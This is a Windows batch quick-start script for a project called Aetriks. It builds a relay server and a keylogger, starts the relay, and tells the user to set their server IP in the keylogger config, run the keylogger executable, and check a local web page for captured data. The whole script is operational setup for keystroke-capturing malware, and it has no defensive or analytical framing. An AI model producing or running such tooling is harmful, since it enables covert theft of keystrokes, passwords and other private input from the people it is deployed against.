@echo off
echo ========================================
echo Aetriks Quick Start Script
echo ========================================
echo.

echo [INFO] This script will set up the complete Aetriks project
echo [INFO] Make sure you have Python and Java installed
echo.

set /p continue="Do you want to continue? (y/n): "
if /i not "%continue%"=="y" (
    echo [INFO] Setup cancelled
    pause
    exit /b 0
)

echo.
echo [STEP 1] Building Relay Server...
call scripts\build_relay_server.bat
if errorlevel 1 (
    echo [ERROR] Relay server build failed
    pause
    exit /b 1
)

echo.
echo [STEP 2] Building Keylogger...
call scripts\build_keylogger.bat
if errorlevel 1 (
    echo [ERROR] Keylogger build failed
    pause
    exit /b 1
)

echo.
echo [STEP 3] Starting Relay Server...
echo [INFO] The server will start in a new window
echo [INFO] Keep this window open to monitor the process
echo.
start "Aetriks Relay Server" scripts\run_relay_server.bat

echo.
echo [SUCCESS] Setup completed!
echo.
echo [INFO] Next steps:
echo 1. The relay server is now running
echo 2. Update keylogger/config.json with your server IP
echo 3. Run keylogger/dist/aetriks-keylogger.exe
echo 4. Check http://localhost:8080 for captured data
echo.
echo [INFO] Press any key to exit...
pause >nul 